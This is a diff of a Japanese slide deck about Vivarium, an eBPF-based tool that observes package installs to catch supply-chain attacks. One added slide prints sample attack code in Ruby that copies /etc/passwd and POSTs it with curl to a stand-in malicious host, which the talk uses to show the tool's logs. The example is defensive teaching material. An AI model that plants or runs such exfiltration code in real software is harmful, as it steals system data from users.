@@ -17,12 +17,27 @@ style: |
     overflow: hidden !important;
     border-radius: 50% !important;
   }
+  section {
+    position: relative;
+  }
+  section::before {
+    content: "";
+    position: absolute;
+    right: 16px;
+    bottom: 12px;
+    width: 100px;
+    height: 100px;
+    background: url("qrcode.png") center / contain no-repeat;
+    opacity: 0.95;
+    pointer-events: none;
+    z-index: 1;
+  }
 ----
 <!--
 _class: hero
 -->
 
-# サプライチェーンアタックが怖いので、セキュリティツールを作り始めた
+# サプライチェーンアタックが怖いので、セキュリティツールを作り始めた話
 
 ### ツナギメオフライン ベンキョウカイ #8
 
@@ -34,11 +49,23 @@ _class: profile
 
 # 自己紹介
 
+![alt text](image.png)
+
 - 近藤うちお (@udzura)
 - エンジニアカフェ ハッカーサポーター
 - 所属: 株式会社SmartHR / Fukuoka.rb
 - 『入門eBPF』（オライリージャパン）という
 本を共同翻訳しました
+
+---
+
+# どうしてもしないといけない宣伝
+
+![bg right:55% h:360](image-1.png)
+
+- 7/3 にエッジランタイムの勉強会をします！＠エンジニアカフェ
+- Cloudlare Workersの話でも、その他の話でもぜひ！
+- QRコードにアクセス！
 
 ---
 
@@ -53,8 +80,8 @@ _class: hero
 ## サプライチェーンアタック、どうしてます？
 
 - 各種対策がある
-  - クールダウン（リリース直後は入れない）
-  - ...色々調べる
+  - **クールダウン**
+  - セキュアプロクシ、トークンを最小権限に、など...
 - クールダウンって...
   - 僕だったらN日待ってから攻撃するスクリプト書きますね...
 
@@ -71,9 +98,9 @@ _class: hero
 ## こういうことをしたい
 
 - 安全な環境で以下をやる
-  - bundler や npm で一度lockfileを更新する
+  - bundler(Ruby) や npm(Node.js) で一度lockfileを更新する
   - 実際にインストールする
-  - smoke 的に起動までを行う
+  - 場合により、 smoke test 的に起動までを行う
   - **その間のアプリケーションの挙動を観察する**
 
 ---
@@ -113,13 +140,31 @@ _class: hero
 
 ## 例えば？
 
-- こういう攻撃コード（curl で malicious なサイトに POST）
-- Vivarium の内部で実行してみる
-- → こういうログが出るぞ！
+- 攻撃コード（curl で malicious なサイトに POST）
+
+```ruby
+system "cat /etc/passwd > /tmp/___________copy.txt 2>&1 || true"
+system "curl -d@/tmp/___________copy.txt http://malicious.udzura.jp" + 
+" >/dev/null 2>&1 || true"
+system "rm -f /tmp/___________copy.txt >/dev/null 2>&1 || true"
+```
+
+- 実際には難読化されているかもしれない
+
+---
+
+## Vivarium 有効状態で実行してみる
+
+こういうログが出るぞ！
+
+![w:700](./ss1.png)
 
 ---
 
 ## ログを AI に渡して判定させることもできる
+
+- さっきの例であれば `/etc/passwd` へのアクセス、 `malicious.udzura.jp` への名前解決などが記録されている
+- ほぼどういうアクションをしたかが筒抜けなので、AIが解読可能
 
 ---
 
@@ -131,7 +176,21 @@ _class: hero
 
 ---
 
-## eBPFの話を少し...
+# Vivariumのコア技術は？
+
+- **eBPF** という Linux カーネルの機能を使って、アプリケーションのシステムイベントを捕捉する
+
+---
+
+# eBPFに詳しくなっちゃおう...
+
+---
+
+# Disclaimer
+
+- ワイはこの本の翻訳者です。
+
+![bg right h:500](image-2.png)
 
 ---
 
@@ -170,13 +229,13 @@ _class: hero
 ## 観察できるイベント（一覧）
 
 - ファイル操作
-- プロセス実行
+- プロセス実行・共有ライブラリのロード
 - ネットワーク接続
 - DNS クエリ
 - SSL/TLS 通信
-- **ENV 操作（libc uprobe）** ← NEW
-- 権限・セキュリティ操作
-- Ruby メソッドトレース（USDT）
+- 環境変数の操作
+- 権限・kill・セキュリティ操作
+- Ruby メソッドのトレース...
 
 ---
 
@@ -202,7 +261,7 @@ BPF LSM + tracepoint でファイル系の操作を捕捉
 | `proc_exec` | `execve` — 実行ファイルパス＋最大3件の引数を記録 |
 | `proc_fork` | `sched_process_fork` — 子プロセスを追跡対象に自動登録 |
 
-- 観察ブロック内で生まれた子孫プロセスも自動でトレース対象になる
+- 観察ブロック内で生まれた子・孫プロセスも自動でトレース対象になる
 
 ---
 
@@ -228,7 +287,7 @@ tracepoint で送信系システムコールをフック
 | `dns_req` | `sendmsg`, `sendto`, `sendmmsg` |
 
 - UDP/53 宛てのパケットから DNS の QNAME（問い合わせドメイン）を抽出
-- ライブラリが裏でどこに問い合わせているか丸見え
+- TODO: TCP/53 とかとか...
 
 ---
 
@@ -245,7 +304,7 @@ uprobe で OpenSSL の関数を直接フック
 
 ---
 
-## イベント: ENV 操作（libc）
+## イベント: 環境変数
 
 uprobe で libc の ENV 操作関数を直接フック
 
@@ -254,8 +313,6 @@ uprobe で libc の ENV 操作関数を直接フック
 | `env_caccess` | `getenv`, `setenv`, `unsetenv`, `putenv`, `clearenv` |
 
 - Ruby の `ENV` クラスを経由した操作に加えてlibcも捕捉する
-- 外部コマンド・ネイティブ拡張が環境変数を読み書きする瞬間を捕捉
-- **ペイロードデコーダ**により変数名・値を復元して表示
 
 ---
 
@@ -277,8 +334,8 @@ severity: **high** 判定になるイベント群
 
 ## Ruby 側のイベントトレース
 
-- Ruby の TracePoint を経由してメソッド invoke をトレースする
-  - require, eval などを捕捉
+- Ruby の TracePoint を経由して指定したメソッドの呼び出しをトレースする
+  - デフォルトでは `require`, `eval` などを捕捉
 - 素朴にやるとパフォーマンス影響が大きいので工夫している（後述）
 
 ---
@@ -287,7 +344,7 @@ severity: **high** 判定になるイベント群
 _class: hero
 -->
 
-# 簡単なアーキテクチャ解説
+# アーキテクチャ解説
 
 ---
 
@@ -295,6 +352,9 @@ _class: hero
 
 - **vivariumd** — デーモンプロセス（eBPF 管理・イベント収集）
 - **クライアント（観察対象）** — `Vivarium.observe` で自分の PID を登録
+  - お互いのやり取りは
+    - カーネルイベント: eBPF / BPF Map
+    - その他データ: UNIX ドメインソケット(UDS)
 
 ---
 
@@ -304,7 +364,7 @@ _class: hero
 2. クライアントでイベントが起こる
 3. → eBPF プログラムが非同期に捕捉
 4. → eBPF の Ringbuf Map にイベントを整形して送信
-5. → ユーザ側でポーリングして順番に取得
+5. → ユーザ側でデーモン経由で順番に取得
 6. → 整形してツリー状に表示
 
 ---
@@ -321,8 +381,16 @@ _class: hero
 - ユーザランドからカーネルに任意のイベントを送れる
 - 拡張ライブラリとして USDT を定義
 - TracePoint の中で invoke（送信は非同期）
-- → カーネルで非同期に、他のシステムイベントと同様に捕捉
+- → カーネルで非同期に、他のシステムイベントと同様に検知できる
 - → Ringbuf に送り、同様に整形可能
+
+---
+
+![bg w:1000](./arch.png)
+
+---
+
+- 時間があればライブデモ...
 
 ---
 
